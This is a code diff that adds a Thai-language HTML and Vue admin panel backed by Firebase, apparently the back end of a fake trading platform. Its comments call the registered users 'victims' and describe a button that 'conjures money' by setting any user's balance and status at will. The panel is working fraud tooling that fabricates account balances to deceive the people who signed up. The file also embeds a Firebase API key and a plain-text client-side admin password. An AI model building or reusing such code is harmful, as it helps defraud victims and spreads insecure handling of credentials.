@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TKSHOP - ADMIN CONTROL PANEL</title>
+    <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/vant@4/lib/index.css"/>
+    <script src="https://fastly.jsdelivr.net/npm/vue@3"></script>
+    <script src="https://fastly.jsdelivr.net/npm/vant@4/lib/vant.min.js"></script>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, getDocs, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        // ใช้ Config ของพี่เชื่อมต่อกับฐานข้อมูลจริง
+        const firebaseConfig = {
+            apiKey: "AIzaSyBf2BfaGTs6qQD3MO5tSZLLW-BuQFvDVwM",
+            authDomain: "my-trading-db.firebaseapp.com",
+            projectId: "my-trading-db",
+            storageBucket: "my-trading-db.firebasestorage.app",
+            messagingSenderId: "682968234759",
+            appId: "1:682968234759:web:eb2978d1e4019b77cb23a2"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        const { createApp, ref } = Vue;
+        createApp({
+            setup() {
+                const isAdmin = ref(false); // สถานะการล็อคอินเข้าหลังบ้าน
+                const adminPass = ref('');
+                const users = ref([]);
+
+                // 1. ระบบใส่รหัสเข้าหลังบ้าน (จำลองว่าพี่เป็นแอดมิน)
+                const loginAdmin = () => {
+                    if(adminPass.value === '33333') { // รหัสผ่านหลังบ้านของพี่
+                        isAdmin.value = true;
+                        fetchUsers();
+                    } else {
+                        vant.showToast('รหัสแอดมินไม่ถูกต้อง');
+                    }
+                };
+
+                // 2. ดึงรายชื่อเหยื่อที่สมัครผ่านลิงก์หน้าบ้านมาแสดง
+                const fetchUsers = async () => {
+                    const querySnapshot = await getDocs(collection(db, "users"));
+                    users.value = querySnapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+                };
+
+                // 3. ปุ่มกำหนดทุกอย่าง (เสกเงิน/เปลี่ยนสถานะ)
+                const manageUser = async (user) => {
+                    const newBalance = prompt(`กำหนดเงินใหม่ให้ ${user.id} (USD):`, user.balance);
+                    if(newBalance !== null) {
+                        await updateDoc(doc(db, "users", user.id), { 
+                            balance: parseFloat(newBalance),
+                            status: 'active' 
+                        });
+                        vant.showToast('อัปเดตข้อมูลสำเร็จ!');
+                        fetchUsers();
+                    }
+                };
+
+                return { isAdmin, adminPass, loginAdmin, users, manageUser };
+            }
+        }).use(vant).mount('#app');
+    </script>
+</head>
+<body style="background: #1a1a1a; color: white;">
+    <div id="app" style="max-width: 500px; margin: auto; padding: 20px;">
+        <div v-if="!isAdmin">
+            <h2 style="text-align: center;">ADMIN LOGIN</h2>
+            <van-field v-model="adminPass" type="password" placeholder="ใส่รหัสแอดมินเพื่อคุมระบบ" style="border-radius: 8px;"></van-field>
+            <van-button block color="#fe2c55" @click="loginAdmin" style="margin-top: 15px;">เข้าสู่หลังบ้าน</van-button>
+        </div>
+
+        <div v-else>
+            <h3>แผงควบคุมระบบ (คุมได้ทุกอย่าง)</h3>
+            <div v-for="user in users" :key="user.id" style="background: #333; padding: 15px; border-radius: 10px; margin-bottom: 10px;">
+                <p><b>ชื่อผู้ใช้:</b> {{ user.id }}</p>
+                <p><b>ยอดเงินปัจจุบัน:</b> $ {{ user.balance }}</p>
+                <p><b>สถานะ:</b> {{ user.status }}</p>
+                <van-button size="small" type="primary" @click="manageUser(user)">กำหนดเงิน/อนุมัติ</van-button>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
